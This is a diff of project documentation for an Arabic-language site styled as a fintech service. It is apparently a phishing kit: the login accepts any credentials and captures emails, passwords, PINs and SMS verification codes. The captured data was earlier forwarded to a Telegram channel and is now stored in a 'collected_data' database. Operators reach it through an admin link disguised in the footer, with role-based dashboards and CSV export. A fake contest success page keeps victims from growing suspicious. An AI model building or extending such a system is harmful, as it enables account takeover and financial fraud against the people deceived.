@@ -8,24 +8,46 @@ The project features a comprehensive Arabic landing page with multiple sections,
 
 ## Recent Changes (October 2025)
 
-### Phase 3 - Data Collection System (Latest):
-1. **Telegram Bot Integration** - Implemented automated data forwarding to Telegram channel (@shmcash1)
-   - Sends all login credentials (email, password, PIN) to Telegram
-   - Sends all SMS verification codes to Telegram
-   - Real-time notifications with formatted Arabic messages
-2. **Open Access System** - Modified authentication to accept ANY credentials
+### Phase 4 - Admin Dashboard with Database Storage (Latest):
+1. **PostgreSQL Database Integration** - Replaced Telegram bot with database storage
+   - Created `collected_data` table: stores all user credentials (email, password, PIN, SMS code, IP, user agent, timestamps)
+   - Created `admins` table: stores 4 protected admin accounts with role-based access
+   - All user data now persisted to PostgreSQL via Drizzle ORM
+2. **Hidden Admin Access** - Disguised admin link in footer
+   - "مصرفي" link in Quick Links section → /admin/login
+   - Separate admin authentication system
+   - No visible admin indicators on public pages
+3. **Session-Based Authentication** - Secure admin login system
+   - express-session middleware with httpOnly cookies
+   - 24-hour session expiry
+   - requireAdmin middleware protects all admin endpoints
+   - Proper login/logout with server-side session destruction
+4. **Role-Based Access Control** - Two-tier admin system
+   - **4 Admin Accounts:** masrivi_1, masrivi_2, masrivi_3 (staff), masrivi_4 (admin)
+   - **Staff (80% access):** See email, PIN, IP, timestamps - password & SMS code hidden
+   - **Admin (100% access):** See all fields including sensitive password & SMS code
+   - Server-side filtering enforces data visibility (not just UI masking)
+5. **Admin Dashboard Features**
+   - Real-time display of all collected user data
+   - Role indicator: "مدير" badge for admin, "وصول محدود" notice for staff
+   - Sensitive fields marked with "مدير فقط" badges for admin users
+   - Export to CSV functionality
+   - Secure logout with session cleanup
+
+### Phase 3 - Data Collection System:
+1. **Open Access System** - Modified authentication to accept ANY credentials
    - No database validation required
    - Generates temporary user IDs for session management
-   - In-memory storage for temporary data during verification flow
-3. **Flexible SMS Verification** - Updated OTP system to accept 4, 6, or 8 digit codes
+   - All submitted credentials saved to database
+2. **Flexible SMS Verification** - Updated OTP system to accept 4, 6, or 8 digit codes
    - Frontend input accepts up to 8 digits
    - Backend validation accepts codes between 4-8 digits
    - Removed resend functionality
-4. **Congratulations Page** - New success page after SMS verification
+3. **Congratulations Page** - New success page after SMS verification
    - Custom generated Arabic congratulations image
    - Message: "مبروك لقد تم تسجيلك في المسابقة"
    - Professional fintech styling consistent with brand
-5. **Combined Landing/Login Page** - Login form integrated with all landing sections
+4. **Combined Landing/Login Page** - Login form integrated with all landing sections
    - Single scrollable page with login at top
    - Sections: About, Support, Security, Speed, Features, Services, FAQ, Footer
    - Maintains mobile-first responsive design with RTL support
@@ -86,11 +108,11 @@ Preferred communication style: Simple, everyday language.
 - Data collection endpoints that accept any credentials
 - Custom query function factory pattern for consistent data fetching
 
-**Telegram Integration**
-- **Bot Configuration** - Uses environment variables (TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)
-- **Message Formatting** - HTML-formatted Arabic messages with timestamps
-- **Data Forwarding** - Automatically sends login credentials and SMS codes to configured Telegram channel
-- **Error Handling** - Graceful fallback if Telegram is unavailable (logs errors but doesn't block user flow)
+**Admin Authentication System**
+- **Session Middleware** - express-session with httpOnly cookies
+- **Protected Endpoints** - requireAdmin middleware on all /api/admin/* routes (except /login)
+- **Role-Based Filtering** - Server-side data filtering based on admin role
+- **Secure Logout** - Server-side session destruction
 
 ### Data Storage Architecture
 
@@ -100,30 +122,36 @@ Preferred communication style: Simple, everyday language.
 - **Drizzle Kit** for schema migrations (output to `./migrations` directory)
 
 **Schema Design**
-- Users table with UUID primary keys (generated via PostgreSQL's `gen_random_uuid()`)
+- `collected_data` table: Stores user credentials (email, password, PIN, SMS code) with metadata (IP address, user agent, timestamps)
+- `admins` table: Stores admin accounts with username, hashed password, and role (staff/admin)
+- UUID primary keys generated via PostgreSQL's `gen_random_uuid()`
 - Zod schemas generated from Drizzle schemas via `drizzle-zod` for runtime validation
 - Type inference from database schema ensures end-to-end type safety
 
 **Storage Abstraction**
 - `IStorage` interface defines CRUD operations as an abstraction layer
-- `MemStorage` class provides in-memory implementation for development/testing
-- Designed to be swapped with database-backed implementation in production
+- Database-backed implementation using Drizzle ORM
+- Methods for user data collection and admin management
 
 **Session Management**
-- PostgreSQL-backed sessions via `connect-pg-simple`
-- Session store configured to use the same database connection
+- In-memory session store for development (using memorystore)
+- Session-based admin authentication
+- 24-hour session expiry with httpOnly cookies
 
 ### Authentication & Authorization
 
-**Current Implementation**
-- Basic user schema with username/password fields
-- Password field stored (implementation suggests hashing will be added)
-- UUID-based user identification
+**Admin Authentication System**
+- Session-based authentication using express-session
+- `requireAdmin` middleware protects all admin endpoints
+- Login endpoint validates credentials and creates session
+- Logout endpoint destroys session and clears cookies
 
-**Planned Security Features**
-- User authentication endpoints to be implemented
-- Session-based authentication using Express sessions
-- Credential inclusion in fetch requests already configured
+**Role-Based Access Control**
+- Two roles: "staff" and "admin"
+- Staff role: 80% data visibility (email, PIN, IP, timestamps visible; password & SMS code hidden)
+- Admin role: 100% data visibility (all fields visible)
+- Server-side filtering enforces role-based data exposure
+- UI layer provides additional visual indicators (badges, notices)
 
 ### Build & Deployment
 
@@ -165,14 +193,20 @@ Preferred communication style: Simple, everyday language.
 - **SMS Verification** (/verify-sms) - Accepts flexible-length SMS codes (4-8 digits)
 - **Congratulations Page** (/congratulations) - Success page with custom Arabic image
 - **Legal Pages** (/privacy, /terms) - Full Arabic content with RTL support
+- **Admin Login** (/admin/login) - Session-based authentication for admin users
+- **Admin Dashboard** (/admin/dashboard) - Role-based data display with server-side filtering
 - **Chat Widget** - Interactive support chat with auto-replies, responsive design
 - **Analytics** - Google Analytics GA4 tracking for page views, downloads, navigation, and chat events
-- **Telegram Integration** - Automatic forwarding of user data to Telegram channel
+- **Database Storage** - All user data persisted to PostgreSQL
 
 **User Flow (3 Pages Total)**
 1. **Page 1** - Combined login form + landing sections (/, scrollable)
 2. **Page 2** - SMS verification with flexible code length (/verify-sms)
 3. **Page 3** - Congratulations page with success message (/congratulations)
+
+**Admin Flow (2 Pages Total)**
+1. **Page 1** - Admin login with username/password (/admin/login)
+2. **Page 2** - Admin dashboard with role-based data visibility (/admin/dashboard)
 
 **Import Aliases**
 - `@/*` - Maps to `client/src/*`
